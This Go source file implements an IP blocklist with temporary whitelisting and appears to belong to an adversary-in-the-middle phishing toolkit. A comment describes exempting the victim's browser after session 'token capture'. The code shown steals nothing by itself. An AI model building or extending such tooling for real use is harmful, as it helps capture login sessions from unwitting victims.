package aitm

import (
	"sync"
	"time"
)

// BlacklistService manages IP-based access control using an in-memory set.
// Persistence will be layered on in a later phase.
type BlacklistService struct {
	bus       EventBus
	mu        sync.Mutex
	blocked   map[string]struct{}
	whitelist map[string]time.Time // IP → temporary exemption expiry
}

func NewBlacklistService(bus EventBus) *BlacklistService {
	return &BlacklistService{
		bus:       bus,
		blocked:   make(map[string]struct{}),
		whitelist: make(map[string]time.Time),
	}
}

func (s *BlacklistService) IsBlocked(ip string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	if exp, ok := s.whitelist[ip]; ok && time.Now().Before(exp) {
		return false
	}
	_, blocked := s.blocked[ip]
	return blocked
}

func (s *BlacklistService) Block(ip string) {
	s.mu.Lock()
	s.blocked[ip] = struct{}{}
	s.mu.Unlock()
}

func (s *BlacklistService) Unblock(ip string) {
	s.mu.Lock()
	delete(s.blocked, ip)
	s.mu.Unlock()
}

// WhitelistTemporary temporarily exempts ip from blocking. Called after token
// capture so the victim's browser isn't blocked during the post-auth redirect.
func (s *BlacklistService) WhitelistTemporary(ip string, dur time.Duration) {
	s.mu.Lock()
	s.whitelist[ip] = time.Now().Add(dur)
	s.mu.Unlock()
}

// List returns blocked IPs in unspecified order.
func (s *BlacklistService) List() []string {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]string, 0, len(s.blocked))
	for ip := range s.blocked {
		out = append(out, ip)
	}
	return out
}
